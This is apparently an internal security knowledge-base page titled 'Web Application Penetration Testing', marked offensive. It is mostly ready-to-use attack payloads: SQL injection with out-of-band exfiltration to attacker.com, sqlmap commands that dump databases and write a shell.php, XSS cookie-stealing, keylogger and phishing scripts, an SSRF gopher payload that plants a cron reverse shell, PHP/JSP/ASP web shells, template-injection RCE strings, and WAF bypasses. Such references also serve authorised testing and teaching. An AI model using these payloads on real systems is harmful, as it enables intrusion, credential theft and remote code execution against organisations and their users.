# Web Application Penetration Testing

> Rush Seed — Palace Security Knowledge Base
> Classification: OFFENSIVE — FOUNDER EYES ONLY
> Version: 1.0 | Created: 2026-03-09

---

## 1. Web Application Testing Philosophy

Web applications are the primary attack surface for most organizations. Every input field, every API endpoint, every file upload is a potential entry point. Rush's principle: **trust nothing from the client — every parameter is an attack vector.**

### 1.1 OWASP Testing Methodology

```
Phase 1: Information Gathering
├── Fingerprint web server
├── Enumerate application entry points
├── Map application architecture
├── Identify technologies and frameworks
└── Review client-side code

Phase 2: Configuration & Deploy Management
├── Test network/infrastructure config
├── Test application platform config
├── Test file extension handling
├── Review backup/unreferenced files
├── Enumerate admin interfaces
└── Test HTTP methods

Phase 3: Identity Management
├── Test role definitions
├── Test user registration
├── Test account provisioning
├── Test account enumeration
└── Test username policy

Phase 4: Authentication
├── Test credentials transport
├── Test default credentials
├── Test account lockout
├── Test authentication bypass
├── Test password policy
├── Test remember me
├── Test browser cache
└── Test multi-factor auth

Phase 5: Authorization
├── Test directory traversal
├── Test authorization bypass
├── Test privilege escalation
├── Test IDOR
└── Test access to admin functions

Phase 6: Session Management
├── Test session token characteristics
├── Test cookie attributes
├── Test session fixation
├── Test CSRF
├── Test session timeout
└── Test session termination

Phase 7: Input Validation
├── Test reflected XSS
├── Test stored XSS
├── Test DOM XSS
├── Test SQL injection
├── Test command injection
├── Test format string
├── Test LDAP injection
├── Test XML injection
├── Test SSRF
├── Test code injection
└── Test template injection

Phase 8: Error Handling
├── Test error codes
├── Test stack traces
└── Test error handling logic

Phase 9: Cryptography
├── Test TLS configuration
├── Test sensitive data in transit
├── Test sensitive data at rest
└── Test crypto implementation

Phase 10: Business Logic
├── Test data validation
├── Test forged requests
├── Test integrity checks
├── Test process timing
├── Test function limits
├── Test workflow circumvention
└── Test application misuse defenses
```

---

## 2. SQL Injection — Advanced

### 2.1 SQL Injection Types

| Type | Description | Detection |
|------|-------------|-----------|
| In-Band (Classic) | Results returned in response | Error messages, UNION output |
| Error-Based | Database errors reveal data | Verbose error messages |
| UNION-Based | Append UNION SELECT to query | Column count matching |
| Blind (Boolean) | True/false responses differ | Page content differences |
| Blind (Time-Based) | Response time differences | Sleep/benchmark delays |
| Out-of-Band | Data sent to external server | DNS/HTTP callbacks |
| Second-Order | Stored payload, executed later | Delayed execution |

### 2.2 Manual SQL Injection Testing

```
# Step 1: Identify injection points
# Test every parameter: GET, POST, cookies, headers, JSON body
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' AND '1'='1
1' AND '1'='2    # Compare behavior with true vs false
1' WAITFOR DELAY '0:0:5'--  # Time-based (MSSQL)
1' AND SLEEP(5)--           # Time-based (MySQL)
1' AND pg_sleep(5)--        # Time-based (PostgreSQL)

# Step 2: Determine database type
# MySQL: SELECT @@version
# MSSQL: SELECT @@version
# PostgreSQL: SELECT version()
# Oracle: SELECT banner FROM v$version
# SQLite: SELECT sqlite_version()

# Step 3: UNION-based extraction
# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--    # Increment until error

# Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

# Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 2.3 Blind SQL Injection

```
# Boolean-based blind
# Determine string character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
# Continue until correct character found (page content changes)

# Faster: Binary search with ASCII values
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90--
# Narrow down the range

# Time-based blind
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
# If response takes 5+ seconds, character is 'a'

# Out-of-Band (OOB)
# MySQL:
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
# MSSQL:
'; EXEC master..xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users)--
# PostgreSQL:
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?data=' || password--
```

### 2.4 SQLMap Automation

```bash
# Basic SQLMap scan
sqlmap -u "https://target.com/page?id=1" --batch

# POST parameter testing
sqlmap -u "https://target.com/login" --data="username=test&password=test" --batch

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie="session=abc123" -p session --batch

# JSON body
sqlmap -u "https://target.com/api/user" --data='{"id":1}' --content-type="application/json"

# Through proxy (Burp)
sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Database enumeration
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D target_db --tables
sqlmap -u "https://target.com/page?id=1" -D target_db -T users --dump

# OS shell (if possible)
sqlmap -u "https://target.com/page?id=1" --os-shell

# File read/write
sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Level and risk (more thorough)
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3
```

### 2.5 WAF Bypass Techniques

```sql
-- Comment-based bypass
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FR/**/OM users

-- Case variation
SeLeCt UsErNaMe FrOm UsErS

-- URL encoding
%53%45%4C%45%43%54 username FROM users
%2553%2545%254C%2545%2543%2554  -- Double URL encoding

-- Unicode bypass
SELECT%u0075sername FROM users

-- Null byte injection
SEL%00ECT username FROM users

-- Concatenation bypass (MySQL)
CONCAT(0x73656C656374) -- hex for 'select'
CHAR(83,69,76,69,67,84)

-- Inline comments (MySQL)
/*!50000SELECT*/ username FROM users

-- Line breaks
SELECT%0Ausername%0AFROM%0Ausers

-- Alternative keywords
# Instead of UNION SELECT:
UNION ALL SELECT
UNION DISTINCT SELECT
# Instead of OR:
|| (Oracle, PostgreSQL)
# Instead of AND:
&& (MySQL)
# Instead of =:
LIKE, RLIKE, REGEXP
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 XSS Types and Context

| Type | Storage | Execution | Example |
|------|---------|-----------|---------|
| Reflected | URL/request | Immediate | Search query reflected in page |
| Stored | Database | On page load | Comment with script tag |
| DOM-Based | Client-side | JavaScript | document.location parsed unsafely |

### 3.2 XSS Payloads by Context

**HTML Context:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror="alert(document.domain)">
<input autofocus onfocus=alert(document.domain)>
```

**Attribute Context:**
```html
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
" onfocus="alert(document.domain)" autofocus="
'><script>alert(document.domain)</script>
```

**JavaScript Context:**
```javascript
';alert(document.domain);//
\';alert(document.domain);//
</script><script>alert(document.domain)</script>
```

**URL/href Context:**
```html
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

**CSS Context:**
```css
expression(alert(document.domain))
url('javascript:alert(document.domain)')
```

### 3.3 XSS Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(document.domain)</ScRiPt>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Polyglot XSS (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//

<!-- SVG-based -->
<svg/onload=alert(document.domain)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>

<!-- Without alert keyword -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<img src=x onerror="Function('ale'+'rt(1)')()">

<!-- DOM clobbering -->
<form id="x"><input name="y" value="payload"></form>
<!-- Access via document.getElementById('x').y.value -->
```

### 3.4 XSS Exploitation

```javascript
// Cookie theft
<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>

// Session hijacking
<script>
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: document.URL,
    localStorage: JSON.stringify(localStorage)
  })
});
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  new Image().src = 'https://attacker.com/log?key=' + e.key;
});
</script>

// Phishing overlay
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h2>Session Expired</h2><form action="https://attacker.com/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form></div>';
</script>

// CSRF via XSS (change email)
<script>
fetch('/api/account/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
});
</script>
```

---

## 4. Cross-Site Request Forgery (CSRF)

### 4.1 CSRF Testing

```html
<!-- Basic CSRF PoC -->
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON CSRF (if server accepts form-encoded as JSON) -->
<form action="https://target.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"amount":1000,"to":"attacker","x":"' value='"}' type="hidden">
</form>

<!-- CSRF with XHR (same-origin or CORS misconfiguration) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true;
xhr.send(JSON.stringify({password: 'hacked123'}));
</script>
```

### 4.2 CSRF Token Bypass

```
1. Remove the token entirely — server might not validate
2. Use blank value — token="" might pass validation
3. Use another user's token — tokens might not be user-bound
4. Change request method — POST→GET might skip CSRF check
5. Token in cookie — CRLF injection to set attacker's token
6. Referer validation bypass — empty Referer with meta tag
   <meta name="referrer" content="no-referrer">
7. Regex bypass on Referer — attacker.com?target.com
8. Content-Type change — application/json → application/x-www-form-urlencoded
```

---

## 5. Server-Side Request Forgery (SSRF)

### 5.1 SSRF Techniques

```
# Basic SSRF
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://target.com/fetch?url=http://localhost:6379/  # Redis
https://target.com/fetch?url=http://localhost:9200/  # Elasticsearch

# Protocol wrappers
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
ftp://internal-server/private-file

# IP address bypass
http://127.0.0.1 → http://127.1 → http://0x7f000001 → http://2130706433
http://0177.0.0.1 (octal) → http://127.0.0.1
http://[::1] (IPv6 loopback)
http://0.0.0.0
http://localhost → http://localtest.me → http://127.0.0.1.nip.io

# DNS rebinding
# Register domain that resolves to 127.0.0.1 on second lookup
# First lookup: legitimate IP (passes validation)
# Second lookup: 127.0.0.1 (fetches internal resource)

# URL parsing confusion
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1%2523@evil.com  # Double encoding

# Redirect-based SSRF
http://evil.com/redirect?url=http://169.254.169.254/
# Your server returns 302 to internal address
```

### 5.2 SSRF Exploitation

```bash
# AWS metadata extraction
# Via SSRF:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal port scanning via SSRF
for port in 80 443 8080 8443 3306 5432 6379 27017 9200; do
  curl "https://target.com/fetch?url=http://localhost:$port" -o /dev/null -w "%{http_code} port:$port\n"
done

# Redis command execution via gopher://
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$11%0d%0ashell_cmd%0d%0a$52%0d%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

---

## 6. File Upload Attacks

### 6.1 Upload Bypass Techniques

```
# Extension bypass
shell.php → shell.php5, shell.phtml, shell.phar, shell.php.jpg
shell.asp → shell.aspx, shell.ashx, shell.asmx
shell.jsp → shell.jspx, shell.jspa, shell.jsw

# Double extension
shell.php.jpg
shell.jpg.php

# Null byte (older systems)
shell.php%00.jpg
shell.php\x00.jpg

# Content-Type bypass
Content-Type: image/jpeg (with PHP content)

# Magic bytes bypass
# Add real image header before PHP code
GIF89a<?php system($_GET['cmd']); ?>
# Or prepend PNG header: \x89PNG\r\n

# .htaccess upload (Apache)
AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code

# Web.config upload (IIS)
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\PHP\php-cgi.exe" />
    </handlers>
  </system.webServer>
</configuration>

# SVG with JavaScript
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

# Polyglot files (valid image AND valid PHP/script)
# Create with tools like: polyglot-image-generator
```

### 6.2 File Upload Exploitation

```bash
# PHP web shell
<?php echo system($_GET['cmd']); ?>

# Minimal PHP shell
<?=`$_GET[0]`?>

# JSP web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ASP web shell
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start(Request["cmd"]); %>

# File upload to RCE chain:
# 1. Upload web shell (bypass filters)
# 2. Find uploaded file location
# 3. Access: https://target.com/uploads/shell.php?cmd=id
# 4. If location unknown, try:
#    /uploads/, /images/, /files/, /media/, /tmp/
#    /wp-content/uploads/ (WordPress)
#    /sites/default/files/ (Drupal)
```

---

## 7. Business Logic Vulnerabilities

### 7.1 Common Business Logic Flaws

```
Price Manipulation:
- Modify price parameter in cart/checkout requests
- Negative quantities
- Currency conversion exploits
- Coupon stacking beyond intended limits
- Race condition: apply discount after price calculated

Authentication Logic:
- Password reset token predictability
- Email verification bypass (change email after verification)
- OAuth state parameter missing (CSRF in OAuth flow)
- Login rate limit bypass (rotate IPs, change case, add spaces)
- 2FA bypass (backup codes, race condition, response manipulation)

Authorization Logic:
- IDOR on all object references
- Forced browsing to admin pages
- Parameter tampering (role=admin, isAdmin=true)
- JWT algorithm confusion (alg:none, HS256→RS256)
- API version downgrade (v2→v1 without security controls)

Workflow Bypass:
- Skip payment step
- Skip email verification
- Skip captcha (direct API call)
- Repeat bonus/reward claims
- Transfer negative amounts
```

### 7.2 Race Condition Exploitation

```python
# Race condition: redeem coupon multiple times
import threading
import requests

url = "https://target.com/api/redeem"
headers = {"Cookie": "session=ABC123", "Content-Type": "application/json"}
data = {"coupon": "SAVE50"}

def redeem():
    r = requests.post(url, json=data, headers=headers)
    print(r.status_code, r.text)

# Send 50 requests simultaneously
threads = []
for i in range(50):
    t = threading.Thread(target=redeem)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
```

```bash
# Turbo Intruder (Burp extension) for race conditions
# Single-packet attack: send multiple requests in one TCP packet
# Ensures simultaneous arrival at server

# Also: curl with parallel execution
seq 1 50 | xargs -P50 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST "https://target.com/api/redeem" \
  -H "Cookie: session=ABC123" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE50"}'
```

---

## 8. Server-Side Template Injection (SSTI)

### 8.1 SSTI Detection and Exploitation

```
# Detection payloads (try in input fields)
{{7*7}}        → 49 (Jinja2, Twig, Freemarker)
${7*7}         → 49 (Freemarker, Velocity, Mako)
<%= 7*7 %>     → 49 (ERB/Ruby)
#{7*7}         → 49 (Pebble, Thymeleaf)
${{7*7}}       → 49 (Thymeleaf)

# Jinja2 (Python/Flask) — RCE
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby) — RCE
<%= system("id") %>
<%= `id` %>

# Velocity (Java)
#set($rt=$class.forName("java.lang.Runtime"))
#set($m=$rt.getMethod("getRuntime",null))
#set($r=$m.invoke(null,null))
$r.exec("id")
```

---

## 9. HTTP Request Smuggling

### 9.1 Request Smuggling Techniques

```
# CL.TE (Content-Length takes precedence on frontend, Transfer-Encoding on backend)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Transfer-Encoding on frontend, Content-Length on backend)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (Both use Transfer-Encoding but can be confused)
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

# Exploitation:
# 1. Bypass security controls (WAF bypass)
# 2. Poison web cache
# 3. Hijack other users' requests
# 4. Capture credentials
# 5. Reflect XSS without user interaction
```

---

## 10. Web Security Testing Tools

### 10.1 Burp Suite Workflow

```
1. Proxy Configuration
   - Set browser proxy to 127.0.0.1:8080
   - Install Burp CA certificate
   - Scope: add target domain(s)

2. Passive Scanning
   - Browse application manually
   - Burp builds site map
   - Passive scanner identifies issues

3. Active Scanning
   - Right-click target in site map
   - "Actively scan this host"
   - Review scan results

4. Manual Testing
   - Send interesting requests to Repeater
   - Modify parameters and observe responses
   - Use Intruder for fuzzing
   - Use Comparer for response differences

5. Essential Extensions
   - Autorize (authorization testing)
   - Active Scan++ (enhanced scanning)
   - Turbo Intruder (race conditions)
   - JWT Editor (JWT manipulation)
   - Hackvertor (encoding/decoding)
   - Logger++ (advanced logging)
   - Param Miner (hidden parameter discovery)
   - Upload Scanner (file upload testing)
```

### 10.2 Other Essential Tools

```bash
# Nuclei — template-based vulnerability scanner
nuclei -u https://target.com -t cves/ -t vulnerabilities/ -t misconfigurations/

# ffuf — web fuzzer
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

# Directory discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Parameter fuzzing
arjun -u https://target.com/endpoint

# Subdomain takeover check
subjack -w subdomains.txt -t 100 -timeout 30 -ssl

# JWT testing
jwt_tool TOKEN -M at  # All tests mode
jwt_tool TOKEN -T     # Tamper mode

# CORS testing
curl -H "Origin: https://evil.com" -I https://target.com/api/data
# Check Access-Control-Allow-Origin in response

# HTTP method testing
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/admin
  echo
done
```

---

## 11. Web Application Firewall (WAF) Bypass

### 11.1 General WAF Bypass Strategies

```
1. Encoding: URL encode, double encode, Unicode encode, hex encode
2. Case variation: MiXeD cAsE payloads
3. Comments: SQL comments, HTML comments to break signatures
4. Chunked encoding: Split payloads across chunks
5. HTTP parameter pollution: param=safe&param=malicious
6. Content-Type manipulation: Change Content-Type header
7. Method override: X-HTTP-Method-Override, _method parameter
8. IP rotation: Change source IP between requests
9. Rate limiting: Slow requests to avoid detection thresholds
10. Protocol-level: HTTP/2, WebSocket, HTTP smuggling

# Cloudflare bypass:
# Find origin IP (Censys, Shodan, historical DNS)
# Direct connection to origin bypasses all Cloudflare rules

# Generic WAF bypass methodology:
# 1. Identify WAF technology
# 2. Identify blocked strings/patterns
# 3. Find alternative representations
# 4. Test payload variations
# 5. Combine bypass techniques
```

---

## 12. Rush's Web Testing Checklist

```
Reconnaissance:
[ ] Technology fingerprinting
[ ] Directory and file enumeration
[ ] Subdomain enumeration
[ ] JavaScript analysis for endpoints
[ ] API documentation discovery

Authentication:
[ ] Default credentials
[ ] Brute force protection
[ ] Account lockout behavior
[ ] Password reset flow
[ ] Session token randomness
[ ] Remember me functionality
[ ] MFA bypass attempts

Authorization:
[ ] IDOR on every object reference
[ ] Horizontal privilege escalation
[ ] Vertical privilege escalation
[ ] Admin function access
[ ] API endpoint authorization

Injection:
[ ] SQL injection (all parameters)
[ ] XSS (reflected, stored, DOM)
[ ] Command injection
[ ] SSTI
[ ] SSRF
[ ] LDAP injection
[ ] Header injection

Client-Side:
[ ] CSRF on state-changing actions
[ ] Open redirects
[ ] Clickjacking (X-Frame-Options)
[ ] CORS misconfiguration
[ ] Postmessage vulnerabilities
[ ] WebSocket security

Business Logic:
[ ] Price manipulation
[ ] Quantity manipulation
[ ] Race conditions
[ ] Workflow bypass
[ ] Feature abuse

Configuration:
[ ] Security headers (CSP, HSTS, etc.)
[ ] Cookie flags (HttpOnly, Secure, SameSite)
[ ] TLS configuration
[ ] Error handling
[ ] Debug mode
[ ] Backup files
```

---

*Rush knows that web applications are the front door of every organization. Every input field is a question, and the wrong answer lets you in. Test them all. Trust none of them. The web doesn't forgive misconfigurations.*
